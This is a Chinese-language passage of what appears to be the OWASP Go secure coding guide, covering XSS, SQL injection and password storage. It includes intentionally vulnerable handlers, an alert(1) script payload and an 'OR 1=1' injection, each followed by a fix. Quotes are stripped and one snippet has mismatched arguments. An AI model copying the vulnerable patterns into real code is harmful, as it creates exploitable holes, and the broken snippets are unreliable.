\u968f\u7740Web\u5e94\u7528\u7a0b\u5e8f\u53d8\u5f97\u590d\u6742\u548c\u4e30\u5bcc\uff0c\u5b83\u4eec\u62e5\u6709\u7684\u6570\u636e\u6e90\u8d8a\u591a\uff1a\u7528\u6237\u3001\u6570\u636e\u5e93\u3001\u4e09\u5341\u65b9\u670d\u52a1\u7b49\u3002\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\uff0c\u6536\u96c6\u5230\u7684\u6570\u636e\u88ab\u8f93\u51fa\u5230\u5177\u6709\u7279\u5b9a\u4e0a\u4e0b\u6587\u7684\u67d0\u4e9b\u5a92\u4f53\uff08\u5982Web\u6d4f\u89c8\u5668\uff09\u3002\u5982\u679c\u6ca1\u6709\u5f3a\u7684\u8f93\u51fa\u7f16\u7801\u7b56\u7565\uff0c\u5219\u6b63\u597d\u53d1\u751f\u6ce8\u5165\u3002 \u5f53\u7136\uff0c\u60a8\u5df2\u7ecf\u542c\u8bf4\u4e86\u6211\u4eec\u5c06\u5728\u672c\u8282\u4e2d\u8ba8\u8bba\u7684\u6240\u6709\u5b89\u5168\u95ee\u9898\uff0c\u4f46\u662f\u60a8\u771f\u7684\u77e5\u9053\u8fd9\u4e9b\u95ee\u9898\u662f\u5982\u4f55\u53d1\u751f\u7684\u548c/\u6216\u5982\u4f55\u907f\u514d\u7684\u5417\uff1f XSS\u8de8\u7ad9\u811a\u672c \u5927\u591a\u6570\u5f00\u53d1\u4eba\u5458\u90fd\u542c\u8bf4\u8fc7\uff0c\u4f46\u5927\u591a\u6570\u4eba\u4ece\u672a\u5c1d\u8bd5\u8fc7\u4f7f\u7528XSS\u5f00\u53d1Web\u5e94\u7528\u7a0b\u5e8f\u3002 \u81ea2003\u5e74\u4ee5\u6765\uff0c\u8de8\u7ad9\u70b9\u811a\u672c\u4e00\u76f4\u4f4d\u4e8eOWASP\u7684\u524d10\u4f4d\uff0c\u5b83\u4ecd\u7136\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u6f0f\u6d1e\u30022013\u5e74\u7684\u7248\u672c\u975e\u5e38\u8be6\u7ec6\u5730\u4ecb\u7ecd\u4e86XSS\uff1a\u653b\u51fb\u5411\u91cf\u3001\u5b89\u5168\u5f31\u70b9\u3001\u6280\u672f\u5f71\u54cd\u548c\u4e1a\u52a1\u5f71\u54cd\u3002 \u7b80\u800c\u8a00\u4e4b \u5982\u679c\u4e0d\u786e\u4fdd\u6240\u6709\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\u90fd\u88ab\u6b63\u786e\u8f6c\u4e49\uff0c\u6216\u8005\u5728\u5c06\u8be5\u8f93\u5165\u5305\u542b\u5230\u8f93\u51fa\u9875\u4e4b\u524d\uff0c\u4e0d\u901a\u8fc7\u670d\u52a1\u5668\u7aef\u8f93\u5165\u9a8c\u8bc1\u6765\u9a8c\u8bc1\u5176\u5b89\u5168\u6027\uff0c\u90a3\u4e48\u60a8\u5c06\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\uff08 source \uff09 Go\uff0c\u5c31\u50cf\u5176\u4ed6\u591a\u7528\u9014\u7f16\u7a0b\u8bed\u8a00\u4e00\u6837\uff0c\u5c3d\u7ba1\u6587\u6863\u4e2d\u660e\u786e\u8bf4\u660e\u4e86\u5982\u4f55\u4f7f\u7528 html/template \u5305\uff0c\u4f46\u5b83\u62e5\u6709\u6240\u6709\u9700\u8981\u5904\u7406\u7684\u4e1c\u897f\uff0c\u5e76\u4f7f\u60a8\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002\u5f88\u5bb9\u6613\u627e\u5230\u4f7f\u7528net/http\u548cio\u5305\u7684\"hello world\"\u793a\u4f8b\uff0c\u5728\u4e0d\u4e86\u89e3\u5b83\u7684\u60c5\u51b5\u4e0b\uff0c\u60a8\u5f88\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002 \u4ee3\u7801\uff1a package main import net/http import io func handler (w http.ResponseWriter, r *http.Request) { io.WriteString(w, r.URL.Query().Get( param1 )) } func main () { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u6b64\u4ee3\u7801\u6bb5\u521b\u5efa\u5e76\u542f\u52a8\u4e00\u4e2aHTTP\u670d\u52a1\u5668\uff0c\u4fa6\u542c\u7aef\u53e38080(main())\uff0c\u5904\u7406\u670d\u52a1\u5668\u6839\u76ee\u5f55(/)\u4e0a\u7684\u8bf7\u6c42\u3002 \u5904\u7406\u8bf7\u6c42\u7684handler()\u51fd\u6570\u9700\u8981\u4e00\u4e2a\u67e5\u8be2\u5b57\u7b26\u4e32\u53c2\u6570 param1 \uff0c\u7136\u540e\u5c06\u5176\u503c\u5199\u5165\u54cd\u5e94\u6d41\uff08w\uff09\u3002 \u7531\u4e8e Content-Type HTTP\u54cd\u5e94\u5934\uff0c\u5c06\u4f7f\u7528go http.detectcontenttype\u9ed8\u8ba4\u503c\uff0c\u8be5\u503c\u9075\u5faa WhatWG\u89c4\u8303 \u3002 \u56e0\u6b64\uff0c\u4f7f param1 \u7b49\u4e8e\"test\"\uff0c\u5c06\u5bfc\u81f4 Content-Type HTTP\u54cd\u5e94\u5934\u4ee5text/plain\u683c\u5f0f\u53d1\u9001\u3002 \u4f46\u5982\u679c param1 \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f h1 \uff0c\u5219 Content-Type \u5c06\u662ftext/html\u3002 \u60a8\u53ef\u80fd\u8ba4\u4e3a\uff0c\u4f7f param1 \u7b49\u4e8e\u4efb\u4f55HTML\u6807\u8bb0\u90fd\u4f1a\u5bfc\u81f4\u76f8\u540c\u7684\u884c\u4e3a\uff0c\u4f46\u5b83\u4e0d\u4f1a\uff1a\u4f7f param1 \u7b49\u4e8e h2 \u3001 span \u6216 form \u5c06\u4f7f Content-Type \u4ee5plain/text\u5f62\u5f0f\u53d1\u9001\uff0c\u800c\u4e0d\u662f\u4ee5\u9884\u671f\u7684text/html\u5f62\u5f0f\u53d1\u9001\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u4f7f param1 \u7b49\u4e8e script alert(1) /script \u6839\u636ewhatwg-spec\uff0c\u5185\u5bb9\u7c7b\u578bhttp-response-header\u5c06\u4ee5\u6587\u672c/html\u5f62\u5f0f\u53d1\u9001\uff0c\u5c06\u5448\u73b0param1\u503c\uff0c\u5e76\u2026\u8fd9\u91cc\u662fXSS\u8de8\u7ad9\u70b9\u811a\u672c\u3002 \u5728\u4e0e\u8c37\u6b4c\u8ba8\u8bba\u4e86\u8fd9\u4e00\u60c5\u51b5\u540e\uff0c\u4ed6\u4eec\u544a\u8bc9\u6211\u4eec\uff1a \u5b83\u5b9e\u9645\u4e0a\u975e\u5e38\u65b9\u4fbf\uff0c\u65e8\u5728\u80fd\u591f\u6253\u5370HTML\u5e76\u81ea\u52a8\u8bbe\u7f6e\u5185\u5bb9\u7c7b\u578b\u3002\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5458\u5c06\u4f7f\u7528HTML/\u6a21\u677f\u8fdb\u884c\u9002\u5f53\u7684\u8f6c\u4e49\u3002 \u8c37\u6b4c\u58f0\u660e\u5f00\u53d1\u4eba\u5458\u8d1f\u8d23\u6e05\u7406\u548c\u4fdd\u62a4\u4ed6\u4eec\u7684\u4ee3\u7801\u3002\u6211\u4eec\u5b8c\u5168\u540c\u610f\uff0c\u4f46\u662f\u5728\u5b89\u5168\u6027\u662f\u4f18\u5148\u8003\u8651\u7684\u8bed\u8a00\u4e2d\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684text/plain\u4e4b\u5916\uff0c\u5141\u8bb8\u81ea\u52a8\u8bbe\u7f6e Content-Type \u5e76\u4e0d\u662f\u6700\u597d\u7684\u65b9\u5f0f\u3002 \u8ba9\u6211\u4eec\u6f84\u6e05\u4e00\u4e0b\uff1a text/plain \u548c/\u6216 text/template \u5305\u4e0d\u4f1a\u8ba9\u60a8\u8fdc\u79bbXSS\uff0c\u56e0\u4e3a\u5b83\u4e0d\u4f1a\u6e05\u7406\u7528\u6237\u8f93\u5165\u3002 package main import net/http import text/template func handler(w http.ResponseWriter, r *http.Request) { param1 := r.URL.Query().Get( param1 ) tmpl := template.New( hello ) tmpl, _ = tmpl.Parse(`{{define T }}{{.}}{{end}}`) tmpl.ExecuteTemplate(w, T , param1) } func main() { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u4f7f param1 \u7b49\u4e8e h1 \u5c06\u5bfc\u81f4\u5185\u5bb9\u7c7b\u578b\u4f5c\u4e3atext/html\u53d1\u9001\uff0c\u8fd9\u4f7f\u60a8\u5bb9\u6613\u53d7\u5230XSS\u7684\u653b\u51fb\u3002 \u5c06text/template\u5305\u66ff\u6362\u4e3ahtml/template\u5305\uff0c\u60a8\u5c31\u53ef\u4ee5\u5b89\u5168\u5730\u7ee7\u7eed\u4e86\u3002 package main import net/http import html/template func handler(w http.ResponseWriter, r *http.Request) { param1 := r.URL.Query().Get( param1 ) tmpl := template.New( hello ) tmpl, _ = tmpl.Parse(`{{define T }}{{.}}{{end}}`) tmpl.ExecuteTemplate(w, T , param1) } func main() { http.HandleFunc( / , handler) http.ListenAndServe( :8080 , nil) } \u5f53param1\u7b49\u4e8e h1 \u65f6\uff0c\u4e0d\u4ec5 Content-Type HTTP\u54cd\u5e94\u5934\u5c06\u4ee5text/plain\u683c\u5f0f\u53d1\u9001\u3002 \u4f46\u662f\uff0c param1\u4e5f \u88ab\u6b63\u786e\u7f16\u7801\u5230\u8f93\u51fa\u5a92\u4f53\uff1a\u6d4f\u89c8\u5668\u3002 SQL\u6ce8\u5165 \u7531\u4e8e\u7f3a\u4e4f\u6b63\u786e\u7684\u8f93\u51fa\u7f16\u7801\uff0c\u53e6\u4e00\u4e2a\u5e38\u89c1\u7684\u6ce8\u5165\u662fSQL\u6ce8\u5165\uff0c\u8fd9\u4e3b\u8981\u662f\u7531\u4e8e\u4e00\u4e2a\u65e7\u7684\u9519\u8bef\u505a\u6cd5\uff1a\u5b57\u7b26\u4e32\u4e32\u8054\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u53ea\u8981\u5c06\u5305\u542b\u4efb\u610f\u5b57\u7b26\uff08\u4f8b\u5982\u5bf9\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6709\u7279\u6b8a\u610f\u4e49\u7684\u5b57\u7b26\uff09\u7684\u503c\u7684\u53d8\u91cf\u7b80\u5355\u5730\u6dfb\u52a0\u5230\uff08\u90e8\u5206\uff09SQL\u67e5\u8be2\u4e2d\uff0c\u5c31\u5bb9\u6613\u53d7\u5230SQL\u6ce8\u5165\u7684\u653b\u51fb\u3002 \u5047\u8bbe\u60a8\u6709\u5982\u4e0b\u67e5\u8be2\uff1a ctx := context.Background() customerId := r.URL.Query().Get( id ) query := SELECT number, expireDate, cvv FROM creditcards WHERE customerId = + customerId row, _ := db.QueryContext(ctx, query) \u4f60\u5c06\u6bc1\u4e86\u5b83\u3002 \u5f53\u63d0\u4f9b\u6709\u6548\u7684customerId\u65f6\uff0c\u60a8\u5c06\u53ea\u5217\u51fa\u8be5\u5ba2\u6237\u7684\u4fe1\u7528\u5361\uff0c\u4f46\u5982\u679ccustomerId\u53d8\u4e3a1\u62161=1\u4f1a\u600e\u4e48\u6837\uff1f \u60a8\u7684\u67e5\u8be2\u5c06\u5982\u4e0b\u6240\u793a\uff1a SELECT number, expireDate, cvv FROM creditcards WHERE customerId = 1 OR 1=1 \u60a8\u5c06\u8f6c\u50a8\u6240\u6709\u8868\u8bb0\u5f55\uff08\u662f\u7684\uff0c\u4efb\u4f55\u8bb0\u5f55\u76841=1\u90fd\u662f\u771f\u7684\uff09\uff01 \u53ea\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u5e93\u7684\u5b89\u5168\uff1a Prepared Statements \u3002 ctx := context.Background() customerId := r.URL.Query().Get( id ) query := SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ? stmt, _ := db.QueryContext(ctx, query, customerId) \u6ce8\u610f\u5230\u5360\u4f4d\u7b26\u4e86?\u4ee5\u53ca\u60a8\u7684\u67e5\u8be2\u65b9\u5f0f\uff1a \u53ef\u8bfb\u6027\u5f3a \u8f83\u77ed \u5b89\u5168\u7684 \u51c6\u5907\u597d\u7684\u8bed\u53e5\u4e2d\u7684\u5360\u4f4d\u7b26\u8bed\u6cd5\u662f\u7279\u5b9a\u4e8e\u6570\u636e\u5e93\u7684\u3002\u4f8b\u5982\uff0c\u6bd4\u8f83mysql\u3001postgresql\u548coracle\uff1a MySQL PostgreSQL Oracle WHERE col = ? WHERE col = $1 WHERE col = :col VALUES(?, ?, ?) VALUES($1, $2, $3) VALUES(:val1, :val2, :val3) \u68c0\u67e5\u672c\u6307\u5357\u4e2d\u7684\"\u6570\u636e\u5e93\u5b89\u5168\u6027\"\u90e8\u5206\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6b64\u4e3b\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u8ba4\u8bc1\u4e0e\u5bc6\u7801\u7ba1\u7406 \u8ba4\u8bc1\u4e0e\u5bc6\u7801\u7ba1\u7406 OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u662f\u4e00\u4e2a\u4fbf\u5229\u7684\u6587\u6863\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u9a8c\u8bc1\u5728\u9879\u76ee\u5b9e\u73b0\u671f\u95f4\u662f\u5426\u9075\u5faa\u4e86\u6240\u6709\u7684\u6700\u4f73\u5b9e\u8df5\u3002\u8eab\u4efd\u9a8c\u8bc1\u548c\u5bc6\u7801\u7ba1\u7406\u662f\u4efb\u4f55\u7cfb\u7edf\u7684\u5173\u952e\u90e8\u5206\uff0c\u4ece\u7528\u6237\u6ce8\u518c\u5230\u51ed\u8bc1\u5b58\u50a8\u3001\u5bc6\u7801\u91cd\u7f6e\u548c\u4e2a\u4eba\u8d44\u6e90\u8bbf\u95ee\u90fd\u6709\u8be6\u7ec6\u4ecb\u7ecd\u3002 \u4e3a\u4e86\u66f4\u6df1\u5165\u7684\u7ec6\u8282\uff0c\u53ef\u4ee5\u5bf9\u4e00\u4e9b\u6307\u5bfc\u539f\u5219\u8fdb\u884c\u5206\u7ec4\u3002\u8fd9\u91cc\u6e90\u4ee3\u7801\u793a\u4f8b\u6765\u8bf4\u660e\u3002 \u7ecf\u9a8c\u89c4\u5219 \u8ba9\u6211\u4eec\u4ece\u7ecf\u9a8c\u89c4\u5219\u5f00\u59cb\uff1a\"\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u63a7\u5236\u90fd\u5fc5\u987b\u5728\u53d7\u4fe1\u4efb\u7684\u7cfb\u7edf\u4e0a\u5f3a\u5236\u6267\u884c\"\uff0c\u901a\u5e38\u662f\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u540e\u7aef\u7684\u670d\u52a1\u5668\u3002 \u4e3a\u4e86\u7cfb\u7edf\u7684\u7b80\u5355\u6027\u548c\u51cf\u5c11\u6545\u969c\u70b9\uff0c\u60a8\u5e94\u8be5\u4f7f\u7528\u6807\u51c6\u7684\u548c\u7ecf\u8fc7\u6d4b\u8bd5\u7684\u8ba4\u8bc1\u670d\u52a1\uff1a\u901a\u5e38\u6846\u67b6\u62e5\u6709\u8fd9\u6837\u7684\u6a21\u5757\uff0c\u5e76\u4e14\u6709\u8bb8\u591a\u4eba\u5f00\u53d1\u3001\u7ef4\u62a4\u548c\u4f7f\u7528\u5b83\u4eec\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u4f7f\u7528\u5b83\u4eec\u4f5c\u4e3a\u4e00\u79cd\u96c6\u4e2d\u7684\u8ba4\u8bc1\u673a\u5236\u3002\u4e0d\u8fc7\uff0c\u60a8\u5e94\u8be5\"\u4ed4\u7ec6\u68c0\u67e5\u4ee3\u7801\u4ee5\u786e\u4fdd\u5b83\u4e0d\u53d7\u4efb\u4f55\u6076\u610f\u4ee3\u7801\u7684\u5f71\u54cd\"\uff0c\u5e76\u786e\u4fdd\u5b83\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u3002 \u8eab\u4efd\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u4e0d\u5e94\u8be5\u662f\u8d44\u6e90\u81ea\u8eab\u6765\u6267\u884c\u5b83,\u76f8\u53cd\uff0c\u5e94\u8be5\u4f7f\u7528\"\u4ece\u96c6\u4e2d\u5f0f\u8eab\u4efd\u9a8c\u8bc1\u63a7\u4ef6\u91cd\u5b9a\u5411\"\u3002\u5c0f\u5fc3\u5904\u7406\u91cd\u5b9a\u5411\uff1a\u60a8\u5e94\u8be5\u53ea\u91cd\u5b9a\u5411\u5230\u672c\u5730\u548c/\u6216\u5b89\u5168\u8d44\u6e90\u3002 \u5f53\u8ba4\u8bc1\u9700\u8981\"\u8fde\u63a5\u5230\u6d89\u53ca\u654f\u611f\u4fe1\u606f\u6216\u529f\u80fd\u7684\u5916\u90e8\u7cfb\u7edf\"\u65f6\uff0c\u5b83\u4e0d\u4ec5\u5e94\u8be5\u7531\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u4f7f\u7528\uff0c\u800c\u4e14\u8fd8\u5e94\u8be5\u7531\u60a8\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\"\u8bbf\u95ee\u5e94\u7528\u7a0b\u5e8f\u5916\u90e8\u670d\u52a1\u7684\u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u5e94\u52a0\u5bc6\u5e76\u5b58\u50a8\u5728\u53d7\u4fe1\u4efb\u7cfb\u7edf\uff08\u5982\u670d\u52a1\u5668\uff09\u4e0a\u7684\u53d7\u4fdd\u62a4\u4f4d\u7f6e\u3002\u5b58\u50a8\u5728\u4ee3\u7801\u4e2d\u4e0d\u662f\u5b89\u5168\u7684\u4f4d\u7f6e\"\u3002 \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u901a\u4fe1 \u5728\u672c\u8282\u4e2d\uff0c\"\u901a\u4fe1\"\u5728\u66f4\u5e7f\u6cdb\u7684\u610f\u4e49\u4e0a\u4f7f\u7528\uff0c\u5305\u62ec\u7528\u6237\u4f53\u9a8c\uff08UX\uff09\u548cCS\u901a\u4fe1\u3002 \u4e0d\u4ec5\"\u5bc6\u7801\u8f93\u5165\u5e94\u5728\u7528\u6237\u5c4f\u5e55\u4e0a\u9690\u85cf\"\uff0c\u800c\u4e14\"\u8bb0\u4f4f\u6211\"\u529f\u80fd\u5e94\u7981\u7528\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u8f93\u5165\u5b57\u6bb5type=\"password\"\u5e76\u5c06autocomplete\u5c5e\u6027\u8bbe\u7f6e\u4e3aoff\u6765\u5b8c\u6210\u8fd9\u4e24\u9879\u5de5\u4f5c\u3002 input type= password name= passwd autocomplete= off / \u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u53ea\u80fd\u5728HTTP POST\u8bf7\u6c42\u4e0a\u4f7f\u7528\u52a0\u5bc6\u8fde\u63a5\uff08HTTPS\uff09\u53d1\u9001\u3002\u52a0\u5bc6\u8fde\u63a5\u7684\u4f8b\u5916\u53ef\u80fd\u662f\u7535\u5b50\u90ae\u4ef6\u91cd\u7f6e\u76f8\u5173\u8054\u7684\u4e34\u65f6\u5bc6\u7801\u3002 \u867d\u7136\u901a\u8fc7tls/ssl\uff08https\uff09\u7684HTTP GET\u8bf7\u6c42\u770b\u8d77\u6765\u548cHTTP POST\u8bf7\u6c42\u4e00\u6837\u5b89\u5168\uff0c\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cHTTP\u670d\u52a1\u5668\uff08\u5982apache2\u3001nginx\uff09\u4f1a\u5c06\u8bf7\u6c42\u7684URL\u5199\u5165\u8bbf\u95ee\u65e5\u5fd7\u3002 xxx.xxx.xxx.xxx - - [27/Feb/2017:01:55:09 +0000] GET /?username=user password=70pS3cure/oassw0rd HTTP/1.1 200 235 - Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0 \u524d\u7aef\u4ee3\u7801\u5982\u4e0b\uff1a form method= post action= https://somedomain.com/user/signin autocomplete= off input type= hidden name= csrf value= CSRF-TOKEN / label Username input type= text name= username / /label label Password input type= password name= password / /label input type= submit value= Submit / /form \u5728\u5904\u7406\u8eab\u4efd\u9a8c\u8bc1\u9519\u8bef\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u5e94\u516c\u5f00\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u7684\u54ea\u4e00\u90e8\u5206\u4e0d\u6b63\u786e\u3002\u4e0d\u8981\u4f7f\u7528\"\u65e0\u6548\u7528\u6237\u540d\"\u6216\"\u65e0\u6548\u5bc6\u7801\"\uff0c\u53ea\u9700\u4ea4\u66ff\u4f7f\u7528\"\u65e0\u6548\u7528\u6237\u540d\u548c/\u6216\u5bc6\u7801\"\uff1a form method= post action= https://somedomain.com/user/signin autocomplete= off input type= hidden name= csrf value= CSRF-TOKEN / div class= error p Invalid username and/or password /p /div label Username input type= text name= username / /label label Password input type= password name= password / /label input type= submit value= Submit / /form \u5bf9\u4e8e\u4e00\u822c\u6027\u4fe1\u606f\uff0c\u60a8\u4e0d\u62ab\u9732\uff1a \u6ce8\u518c\u4eba\uff1a\"\u65e0\u6548\u5bc6\u7801\"\u8868\u793a\u7528\u6237\u540d\u5b58\u5728\u3002 \u7cfb\u7edf\u7684\u5de5\u4f5c\u65b9\u5f0f\uff1a\"\u65e0\u6548\u5bc6\u7801\"\u53ef\u80fd\u4f1a\u663e\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u9996\u5148\u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u7684\u7528\u6237\u540d\uff0c\u7136\u540e\u6bd4\u8f83\u5185\u5b58\u4e2d\u7684\u5bc6\u7801\u3002 \u9a8c\u8bc1\u548c\u5b58\u50a8\u90e8\u5206\u63d0\u4f9b\u4e86\u5982\u4f55\u6267\u884c\u9a8c\u8bc1\u6570\u636e\u9a8c\u8bc1\uff08\u548c\u5b58\u50a8\uff09\u7684\u793a\u4f8b\u3002 \u6210\u529f\u767b\u5f55\u540e\uff0c\u5e94\u901a\u77e5\u7528\u6237\u4e0a\u6b21\u6210\u529f\u6216\u4e0d\u6210\u529f\u7684\u8bbf\u95ee\u65e5\u671f/\u65f6\u95f4\uff0c\u4ee5\u4fbf\u7528\u6237\u80fd\u591f\u68c0\u6d4b\u548c\u62a5\u544a\u53ef\u7591\u6d3b\u52a8\u3002\u6709\u5173\u65e5\u5fd7\u8bb0\u5f55\u7684\u66f4\u591a\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406\u548c\u65e5\u5fd7\u8bb0\u5f55 \u4e2d\u627e\u5230\u3002\u6b64\u5916\uff0c\u4e3a\u4e86\u9632\u6b62\u653b\u51fb\uff0c\u5efa\u8bae\u5728\u68c0\u67e5\u5bc6\u7801\u65f6\u4f7f\u7528\u6052\u5b9a\u65f6\u95f4\u6bd4\u8f83\u529f\u80fd\uff0c\u5305\u62ec\u5206\u6790\u5177\u6709\u4e0d\u540c\u8f93\u5165\u7684\u591a\u4e2a\u8bf7\u6c42\u4e4b\u95f4\u7684\u65f6\u95f4\u5dee\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u8868\u5355record==password\u6bd4\u8f83\u4e0d\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5904\u5c06\u4f1a\u8fd4\u56defalse\uff0c\u63d0\u4ea4\u7684\u5bc6\u7801\u65f6\u95f4\u8d8a\u8fd1\uff0c\u54cd\u5e94\u65f6\u95f4\u8d8a\u957f\u3002\u901a\u8fc7\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u731c\u6d4b\u5bc6\u7801\u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u8bb0\u5f55\u4e0d\u5b58\u5728\uff0c\u6211\u4eec\u4e5f\u603b\u662f\u5f3a\u5236\u6267\u884c\u5e26\u6709\u7a7a\u503c\u7684subtle.ConstantTimeCompare\u4ee5\u4fbf\u4e0e\u7528\u6237\u8f93\u5165\u8fdb\u884c\u6bd4\u8f83\u3002 \u9a8c\u8bc1\u4e0e\u5b58\u50a8 \u9a8c\u8bc1 \u672c\u8282\u7684\u5173\u952e\u4e3b\u9898\u662f\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5b58\u50a8\uff0c\u56e0\u4e3a\u7528\u6237\u5e10\u6237\u6570\u636e\u5e93\u7ecf\u5e38\u5728Internet\u4e0a\u6cc4\u6f0f\uff0c\u8fd9\u662f\u4e0d\u53ef\u53d6\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u53d1\u751f\uff0c\u4f46\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6b63\u786e\u5b58\u50a8\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\uff0c\u7279\u522b\u662f\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u9644\u5e26\u7684\u635f\u5bb3\u3002 \u9996\u5148\uff0c\u8ba9\u6211\u4eec\u660e\u786e\u201c\u6240\u6709\u8ba4\u8bc1\u63a7\u5236\u90fd\u5e94\u8be5\u5b89\u5168\u5931\u8d25\u201d\u3002\u5efa\u8bae\u60a8\u9605\u8bfb\u6240\u6709\u5176\u4ed6\u8eab\u4efd\u9a8c\u8bc1\u548c\u5bc6\u7801\u7ba1\u7406\u90e8\u5206\uff0c\u56e0\u4e3a\u5b83\u4eec\u5305\u62ec\u6709\u5173\u62a5\u544a\u9519\u8bef\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u548c\u5982\u4f55\u5904\u7406\u65e5\u5fd7\u8bb0\u5f55\u7684\u5efa\u8bae\u3002 \u53e6\u4e00\u4e2a\u521d\u6b65\u5efa\u8bae\u662f\uff1a\u5bf9\u4e8e\u987a\u5e8f\u8ba4\u8bc1\u7684\u5b9e\u73b0\uff08\u50cfGoogle\u73b0\u5728\u505a\u7684\u90a3\u6837\uff09\uff0c\u9a8c\u8bc1\u5e94\u8be5\u53ea\u5728\u6240\u6709\u6570\u636e\u8f93\u5165\u5b8c\u6210\u540e\uff0c\u5728\u53ef\u4fe1\u7cfb\u7edf\uff08\u5982\u670d\u52a1\u5668\uff09\u4e0a\u8fdb\u884c\u3002 \u5b89\u5168\u5b58\u50a8\u5bc6\u7801\u7406\u8bba package main import ( crypto/rand crypto/sha256 database/sql context fmt ) const saltSize = 32 func main() { ctx := context.Background() email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // create random word salt := make([]byte, saltSize) _, err := rand.Read(salt) if err != nil { panic(err) } // let's create SHA256(password+salt) hash := sha256.New() hash.Write(password) hash.Write(salt) // this is here just for demo purposes // // fmt.Printf( email : %s\\n , string(email)) // fmt.Printf( password: %s\\n , string(password)) // fmt.Printf( salt : %x\\n , salt) // fmt.Printf( hash : %x\\n , hash.Sum(nil)) // you're supposed to have a database connection stmt, err := db.PrepareContext(ctx, INSERT INTO accounts SET hash=?, salt=?, email=? ) if err != nil { panic(err) } result, err := stmt.ExecContext(ctx, email, h, salt) if err != nil { panic(err) } } \u7136\u800c\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6709\u51e0\u4e2a\u7f3a\u9677\uff0c\u4e0d\u5e94\u8be5\u4f7f\u7528\u3002\u672c\u6587\u4ec5\u7528\u4e00\u4e2a\u5b9e\u4f8b\u6765\u8bf4\u660e\u8fd9\u4e00\u7406\u8bba\u3002\u4e0b\u4e00\u8282\u5c06\u89e3\u91ca\u5982\u4f55\u5728\u73b0\u5b9e\u751f\u6d3b\u4e2d\u6b63\u786e\u8bbe\u7f6e\u5bc6\u7801\u3002 \u5b89\u5168\u5b58\u50a8\u5bc6\u7801\u5b9e\u8df5 \u4e0b\u9762\u7684\u793a\u4f8b\u6f14\u793a\u5982\u4f55\u4f7f\u7528bcrypt\uff0c\u8fd9\u5bf9\u4e8e\u5927\u591a\u6570\u60c5\u51b5\u90fd\u662f\u8db3\u591f\u597d\u7684\u3002BCRYPT\u7684\u4f18\u70b9\u662f\u4f7f\u7528\u8d77\u6765\u66f4\u7b80\u5355\uff0c\u56e0\u6b64\u4e0d\u6613\u51fa\u9519\u3002 package main import ( database/sql context fmt golang.org/x/crypto/bcrypt ) func main() { ctx := context.Background() email := []byte( john.doe@somedomain.com ) password := []byte( 47;u5:B(95m72;Xq ) // Hash the password with bcrypt hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost) if err != nil { panic(err) } // this is here just for demo purposes // // fmt.Printf( email : %s\\n , string(email)) // fmt.Printf( password : %s\\n , string(password)) // fmt.Printf( hashed password: %x\\n , hashedPassword) // you're supposed to have a database connection stmt, err := db.PrepareContext(ctx, INSERT INTO accounts SET hash=?, email=? ) if err != nil { panic(err) } result, err := stmt.ExecContext(ctx, hashedPassword, email) if err != nil { panic(err) } } 